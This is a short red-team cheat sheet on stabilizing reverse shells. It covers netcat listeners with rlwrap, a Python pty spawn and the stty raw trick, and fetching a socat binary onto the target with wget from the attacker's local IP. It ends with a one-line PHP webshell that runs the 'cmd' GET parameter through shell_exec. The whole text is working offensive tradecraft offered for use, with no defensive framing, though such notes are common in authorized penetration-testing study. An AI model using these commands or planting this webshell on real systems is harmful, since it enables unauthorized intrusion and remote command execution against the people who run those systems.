---
category:
  - redteam
---

# Stabilization
## TTY Size
In second terminal window, get rows & columns with `stty -a`, then set them in the remote shell with `stty {rows|cols} <number>`

## Netcat
Rlwrap: `rlwrap nc -lvnp <port>`
If Python is available:
```bash
sudo nc -lvnp 1234  # listen for connections on port 1234
python -c 'import pty;pty.spawn("/bin/bash")'   # start bash
export TERM=xterm
[Ctrl+Z]    # background the session
stty raw -echo; fg     # Stabilze and foreground the shell
```
## Socat
If Python is available:
```
# Start Python webserver on local machine
sudo python3 -m http.server 80
# Get a netcat shell
sudo nc -lvnp <port> 
# Download socat compiled binary to target machine
wget \{local IP}/socat -O /tmp/socat
```

# Basic Webshell
```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
See `/usr/share/webshells` on Kali
